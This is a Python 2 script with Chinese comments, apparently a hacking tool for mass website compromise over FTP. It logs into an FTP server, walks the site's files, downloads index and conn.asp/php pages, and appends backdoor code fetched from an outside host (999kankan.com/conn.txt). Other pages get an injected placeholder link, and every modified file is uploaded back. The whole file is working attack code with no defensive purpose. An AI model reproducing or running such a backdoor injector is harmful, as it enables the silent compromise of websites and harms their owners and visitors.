#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#对FTP实现挂马
import sys
import re
import ftplib
import time
import urllib2
import os

hm_list=['conn.asp','CONN.asp','conn.php','CONN.php','index.asp','index.htm','index.html','index.jsp']  #添加啊后门列表
#ERR_NOERR, ERR_PARAM, ERR_FTP = range(3)  #代表从0到3(不包含3)  产生随机数
#####################################
def walk_ftp(ftp, cd = None, nodir = True):  #遍历FTP文件
    if cd:
        stack = [('d', cd)]
    else:
        stack = [('d', '/')]
    def get_item_info(line):  #获取目录信息
        info = line.split()  #string由字符串分割成的列表   但是这个地方没设置规则啊  难道以空格区分吗
        #info[0][0]获取是根目录还文件夹   info[8] 文件名称还是文件夹
        stack.append((info[0][0], '/'.join([pwd, info[8]])))  #pwd前所在位置
        #向列表的尾部添加一个新的元素
    while stack:
        s_top = stack.pop()
        if s_top[1][-2:]=='/.' or s_top[1][-3:]=='/..':
            continue #停止跳过这个
        if s_top[0] == '-': #根目录文件
            yield s_top[1].replace('//', '/')  #根据正则进行替换
        elif s_top[0] == 'd':  #文件夹
            try:
                ftp.cwd(s_top[1])  #选择操作目录    打开文件夹
            except:
                continue  #停止跳过这个异常
            pwd = ftp.pwd()  #返回当前所在位置
            ftp.dir(get_item_info)  #显示目录下文件信息
            if not nodir:  #not 取反   不明白什么意思
                yield s_top[1].replace('//', '/') #根据正则进行替换



def open_ftp(host,user,passwd):  #采集要挂马的地址
    try:
        del_list() #清空数组
        ftp = ftplib.FTP(host)
        ftp.login(user, passwd)
        print u"登陆FTP成功"
        try:
            index=0

            for item in walk_ftp(ftp):
                if index>=3000:
                    print u"遍历目录3000个文件过多停止"
                    return 1
                E = 0 #得到list的第一个元素
                while E < len(list_wwwlist):
                    data=list_wwwlist[E]
                    data1=data.replace('\n','')
                    if not data1=="": #取反
                        if re.search(data1,item.split('/')[-1]):
                            print '找到:',item
                            FTP_list.append(item)
                    E += 1
                time.sleep(0.001) #确保先运行Seeker中的方法
                index +=1
            print u"遍历目录完成"
            ftp.quit()  #退出ftp
            return 1
        except:
            ftp.quit()  #退出ftp
            print u"遍历FTP异常"
            return 1
        #sys.exit(exitcode)   #退出这个函数   不是整个退出
    except:
        print u"连接FTP异常"
        return 0

##################################################
#遍历数组   下载   修改   上传
def open_list(host,user,passwd):#遍历数组
    try:
        ftpU = ftplib.FTP(host)
        ftpU.login(user, passwd)
        try:
            E = 0 #得到list的第一个元素
            while E < len(FTP_list):
                print u"开始处理%s地址"%(FTP_list[E]),
                if ftp_download(ftpU,FTP_list[E]):  #下载
                    if hm_LT(FTP_list[E]): #查看是否要添加后门
                        #是
                        if hm_txt_write(FTP_list[E]):  #向文本中写入数据
                            if ftp_upload(ftpU,FTP_list[E]): #上传文件
                                print u"%s下载-修改-上传-文件完成"%(FTP_list[E])
                    else:
                        #否
                        if txt_write(FTP_list[E]):  #向文本中写入数据
                            if ftp_upload(ftpU,FTP_list[E]): #上传文件
                                print u"%s下载-修改-上传-文件完成"%(FTP_list[E])
                    del_file(FTP_list[E])  #删除文件
                E = E + 1
            print u"遍历目录修改上传完成"
            ftpU.quit()  #退出ftp
            return 1
        except:
            ftpU.quit()  #退出ftp
            print u"遍历FTP异常"
            return 1
    except:
        print u"连接FTP异常"
        return 0

def del_file(ftp_download):  #删除文件
    try:
        item=ftp_download
        nPos = item.rfind('/') #查找字符
        L_1=len(item)
        sStr1 = item[nPos+1:L_1] #复制指定长度的字符
        feil=os.getcwd()  #获得当前工作目录
        #data1=feil+"\\"+sStr1
        #print data1
        for allDirs,dirs,filename in os.walk(feil):
            if sStr1 in filename:
                os.remove(feil + "/" + sStr1)
                #    print("\n删除成功！")
                #if sStr1 not in filename:
                #    print("未找到所要删除的文件！")
        return 0
    except:
        return 0
#####################
#后门部分
def post_url():  #获取后门
    try:
        URL="http://999kankan.com/conn.txt"
        s = urllib2.urlopen(URL,timeout=10)  # 超时10秒   #s = urllib2.urlopen(r"http://www.163.com")
        ss = s.read()
        data1=ss.replace('bing','')
        data2=data1.replace('end','')
        return data2
    except:
        #print u"获取后门失败"
        return ""

def hm_LT(ftp_download): #查看是否要添加后门
    try:
        item=ftp_download
        nPos = item.rfind('/') #查找字符
        L_1=len(item)
        sStr1 = item[nPos+1:L_1] #复制指定长度的字符
        E = 0 #得到list的第一个元素
        while E < len(hm_list):
            if hm_list[E]==sStr1:
                return 1
            E = E + 1
        return 0
    except:
        return 0

def hm_txt_write(ftp_download):  #向文本中写入数据
    try:
        item=ftp_download
        nPos = item.rfind('/') #查找字符
        L_1=len(item)
        sStr1 = item[nPos+1:L_1] #复制指定长度的字符
        f = open(sStr1, 'r')
        data=""
        data=f.read()
        f.close()  #关闭文本
        hmdata=post_url()  #获取后门
        hmdata1=hmdata+"\r\n"+data_write
        nPos = data.rfind(hmdata1) #查找字符
        if nPos>0:
            print u"已经有要写入的数据了不在写入"
            return 0
        else:
            file_object = open(sStr1,'a')  #追加写文件
            file_object.write(hmdata1)
            #file_object.writelines(list_of_text_strings)  #写入多行
            file_object.close()
            return 1
    except:
        print u"写入数据%s失败"%(ftp_download)
        return 0
#####################
#向文本中写入数据
def txt_write(ftp_download):  #向文本中写入数据
    try:
        item=ftp_download
        nPos = item.rfind('/') #查找字符
        L_1=len(item)
        sStr1 = item[nPos+1:L_1] #复制指定长度的字符
        f = open(sStr1, 'r')
        data=""
        data=f.read()
        f.close()  #关闭文本
        nPos = data.rfind(data_write) #查找字符
        if nPos>0:
            print u"已经有要写入的数据了不在写入"
            return 0
        else:
            file_object = open(sStr1,'a')  #追加写文件
            file_object.write(data_write)
            #file_object.writelines(list_of_text_strings)  #写入多行
            file_object.close()
            return 1
    except:
        print u"写入数据%s失败"%(ftp_download)
        return 0

#下载
def ftp_download(ftpU,ftp_download):  #下载
    try:
        #ftp_download = "/home/pub/dog.jpg";
        #print ftp.getwelcome() #显示ftp服务器欢迎信息
        bufsize = 1024 #设置缓冲块大小
        item=ftp_download
        nPos = item.rfind('/') #查找字符
        L_1=len(item)
        sStr1 = item[nPos+1:L_1] #复制指定长度的字符
        fp = open(sStr1,'wb') #以写模式在本地打开文件
        ftpU.retrbinary('RETR ' + ftp_download,fp.write,bufsize) #接收服务器上文件并写入本地文件
        print u"下载%s成功"%(ftp_download),
        return 1
    except:
        print u"下载%s失败"%(ftp_download)
        return 0

#上传文件
def ftp_upload(ftpU,ftp_download): #上传文件
    try:
        item=ftp_download
        nPos = item.rfind('/') #查找字符
        L_1=len(item)
        sStr1 = item[nPos+1:L_1] #复制指定长度的字符
        bufsize = 1024
        fp = open(sStr1,'rb')
        ftpU.storbinary('STOR '+ ftp_download,fp,bufsize) #上传文件
        #ftpU.set_debuglevel(0)  #关闭调试模式
        fp.close() #关闭文件
        #ftpU.quit()   #退出ftp
        print u"上传文件文件",sStr1,u"成功"
        return 1
    except:
        print u"上传文件%s失败"%(ftp_download)
        return 0
##################################################
def open_txt():  #打开TXT文本写入数组
    try:
        xxx = file('wwwroot.txt', 'r')
        #for xxx_line in xxx.read().split('\n'):
        for xxx_line in xxx.readlines():
            wwwlist.append(xxx_line)
        xxx.close()

        for i in wwwlist:
            if i not in list_wwwlist:
                list_wwwlist.append(i)
    except:
        return 0

def del_list(): #清空数组
    i = 0 #得到list的第一个元素
    while i < len(FTP_list):
        del FTP_list[i]


#####################################
if __name__=='__main__':
    global  wwwlist  #声明全局变量
    wwwlist = []    #wwwroot.txt  获取
    global  list_wwwlist  #列表去重，不打乱原来的顺序
    list_wwwlist=[]

    global  FTP_list  #声明全局变量
    FTP_list = []    #FTP保存路径

    global data_write  #写入数据
    data_write="SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
#    global  list_FTP_list  #
#    list_FTP_list = []
    open_txt()  #打开TXT文本写入数组
#
    if open_ftp("127.0.0.1","admin","admin"):  #采集要挂马的地址
        #print u"获取别表完成"
        print u"查找到要挂的链接%s个"%(len(FTP_list))
        if len(FTP_list)>0:  #判断有连接需要挂黑链没
            open_list("127.0.0.1","admin","admin")#遍历数组
#    E = 0 #得到list的第一个元素
#    while E < len(FTP_list):
#        print FTP_list[E]
#        E = E + 1